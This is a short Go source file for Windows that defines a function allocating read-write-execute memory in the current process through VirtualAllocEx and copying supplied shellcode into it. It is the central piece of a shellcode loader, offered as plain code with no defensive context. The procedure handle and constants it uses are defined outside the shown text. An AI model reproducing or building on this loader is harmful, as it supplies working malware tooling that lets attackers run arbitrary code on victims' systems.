//go:build windows

package main

import (
	"fmt"
	"unsafe"
)

// allocExec allocates RWX memory via VirtualAlloc and copies shellcode in.
func allocExec(sc []byte) (uintptr, error) {
	addr, _, err := procVirtualAllocEx.Call(
		^uintptr(0), // current process (-1)
		0,
		uintptr(len(sc)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAlloc: %v", err)
	}
	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(sc):len(sc)]
	copy(dst, sc)
	return addr, nil
}
